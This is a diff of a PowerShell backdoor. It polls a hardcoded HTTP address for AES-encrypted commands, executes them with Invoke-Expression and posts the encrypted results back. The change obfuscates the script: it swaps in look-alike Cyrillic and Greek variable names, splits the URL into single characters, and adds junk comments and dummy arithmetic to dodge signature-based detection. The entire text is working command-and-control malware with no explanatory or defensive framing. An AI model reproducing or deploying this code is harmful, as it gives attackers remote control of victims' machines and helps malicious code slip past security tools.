@@ -1,20 +1,30 @@
-$K = [System.Text.Encoding]::UTF8.GetBytes("abcdefghijklmnop")
-$A = New-Object System.Security.Cryptography.AesCryptoServiceProvider
-$A.Mode = [System.Security.Cryptography.CipherMode]::CBC
-$A.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-$A.Key = $K
-$U='http'+':'+'/'+'/'+'1'+ '9'+'2'+'.'+'1'+ '6'+'8'+'.'+'0'+ '.'+'1'+ '0'+ '2'+':'+ '8'+'0'+'0'+ '0'
+$Κ = [System.Text.Encoding]::UTF8.GetBytes("abcdefghijklmnop")
+$А = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+$А.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$А.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$А.Key = $Κ
+$U='h'+ 't'+ 't'+ 'p'+':'+ '/'+'/'+ '1'+ '9'+'2'+'.'+'1'+ '6'+'8'+'.'+'0'+ '.'+'1'+ '0'+ '2'+':'+ '8'+'0'+'0'+ '0'
+# ???????????????????????????????????????????¯\_(ツ)_/¯ 
+#
 while($true){
-    $A.IV=New-Object byte[] 16
-    $D=$A.CreateDecryptor()
+    
+    $А.IV=New-Object byte[] 16
+    $D=$А.CreateDecryptor()
     $R=Invoke-WebRequest -Uri $U
     $C=[Convert]::FromBase64String($R.Content)
     $PT=$D.TransformFinalBlock($C, 0, $C.Length)
     $D=[System.Text.Encoding]::UTF8.GetString($PT)
     $E=iex $D
     $PT=[System.Text.Encoding]::UTF8.GetBytes($E)
-    $E=$A.CreateEncryptor()
+    $E=$А.CreateEncryptor()
     $C=$E.TransformFinalBlock($PT, 0, $PT.Length)
     $C=[Convert]::ToBase64String($C)
+    
+    #
     Invoke-WebRequest -Uri $U -Method POST -Body $C
+    #ツツツツツツツツツツツツツツツツツツツツツツツ ¯\_(?)_/¯  
+    $Θ = 10 + 2 * 3 / 4 - 5
+    $Γ = $Κ + $Θ
+    $Δ = $Γ + $Κ
+    $Ν = $Δ / 2
 }
